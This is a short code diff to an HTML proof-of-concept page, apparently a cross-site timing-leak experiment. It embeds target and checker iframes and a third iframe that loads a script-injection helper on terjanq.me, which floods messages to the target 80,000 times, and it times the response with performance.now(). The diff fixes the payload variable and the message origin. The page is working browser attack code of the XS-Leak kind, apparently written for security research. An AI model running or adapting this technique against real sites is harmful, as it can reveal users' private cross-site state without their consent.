@@ -1,7 +1,7 @@
 <body>
     <iframe id="target" src="https://ndevtk.github.io/cross-site/"></iframe>
     <iframe id="checker" src="https://ndevtk.github.io/cross-site/"></iframe>
-    <iframe id="spam" src="https://terjanq.me/xss.php?js=onmessage=function(event){for(let i=80000;i--;)parent[0].postMessage(value,'*');}"></iframe>
+    <iframe id="spam" src="https://terjanq.me/xss.php?js=onmessage=function(event){for(let i=80000;i--;)parent[0].postMessage(e.data,'*');}"></iframe>
     <script>
       let target = document.getElementById('target');
       let checker = document.getElementById('checker');
@@ -14,7 +14,7 @@
             resolve(performance.now() - start);
           };
           let start = performance.now();
-          spam.contentWindow.postMessage("", "*");
+          spam.contentWindow.postMessage(value, "https://terjanq.me");
           checker.contentWindow.location = "https://ndevtk.github.io/cross-site/";
         });
       }
